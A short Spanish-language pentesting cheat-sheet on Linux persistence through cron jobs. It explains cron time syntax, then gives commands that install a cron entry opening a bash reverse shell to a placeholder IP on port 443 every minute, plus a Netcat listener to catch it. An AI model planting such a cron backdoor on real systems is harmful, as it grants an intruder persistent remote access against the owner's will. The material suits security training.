# Escalación de privilegios en Linux

Tags: #Linux #PrivEsc #Persistence 

## Persistencia Vía tareas Cron

```bash 
# Las tareas Cron son un servicio basado en tiempo que corre aplicaciones, scripts y otros comandos repetidamente en una fecha especifica. 

# Anatomia de una tarea Cron (Izquierda a derecha)
   * * * * *
# 1er * = min (0 - 59)
# 2do * = hour (0 -23)
# 3er * = day of month (1 -31)
# 4to * = month (1 - 12)
# 5to * = day of week (0 - 7)

# ***** significa que la tarea Cron correra cada minuto de cada hora de cada dia de cada mes y cada dia de la semana 


❯ cat /etc/cron*        # Mirar todas las tareas Cron y el usuario que las esta ejecutando   

❯ echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/IP/443 0>&1' " > cron  # Crearemos una tarea Cron que nos haga una Revershell 
❯ crontab -i cron       # Agregas la tarea que acabas de crear a las tareas Cron
❯ crontab -l            # Listas las tareas Cron 

# Despues de que se este ejecutando la tarea Cron en la maquina vitima, podemos ponernos en escucha para recibir la conexion
❯ nc -nlvp 443          # Nos ponemos en escucha con Netcat 
```